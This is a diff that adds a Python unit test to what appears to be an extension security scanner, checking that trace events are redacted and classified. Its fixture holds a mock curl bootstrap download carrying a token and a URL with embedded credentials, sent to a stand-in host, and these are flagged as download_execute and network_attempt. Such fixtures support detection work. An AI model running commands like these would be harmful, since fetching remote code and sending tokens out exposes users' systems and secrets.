@@ -3850,6 +3850,35 @@ class ScannerTests(unittest.TestCase):
         self.assertIn("network_attempt", {item["kind"] for item in observations})
         self.assertIn("secret_exfil", {item["kind"] for item in observations})
 
+    def test_runtime_evidence_redacts_extension_supplied_secrets(self) -> None:
+        with TemporaryDirectory() as tmp:
+            trace = Path(tmp) / "trace.jsonl"
+            trace.write_text("\n".join(json.dumps(item) for item in [
+                {
+                    "kind": "network",
+                    "api": "global.fetch",
+                    "target": "https://user:pass@example.invalid/collect?token=token-value&safe=1",
+                },
+                {
+                    "kind": "process_exec",
+                    "api": "execFile",
+                    "command": "curl https://example.invalid/bootstrap --token token-value",
+                },
+                {
+                    "kind": "command_probe_error",
+                    "error": "Bearer bearer-value",
+                },
+            ]) + "\n", encoding="utf-8")
+            observations = _observations_from_trace(trace, [])
+
+        serialized = json.dumps(observations, sort_keys=True)
+        self.assertNotIn("token-value", serialized)
+        self.assertNotIn("user:pass", serialized)
+        self.assertNotIn("bearer-value", serialized)
+        self.assertIn("network_attempt", {item["kind"] for item in observations})
+        self.assertIn("download_execute", {item["kind"] for item in observations})
+        self.assertIn("[redacted]", serialized)
+
     def test_runtime_event_transport_rejects_forged_events(self) -> None:
         secret = "a" * 64
         payload = json.dumps({"kind": "network", "target": "https://example.invalid"}, separators=(",", ":"))
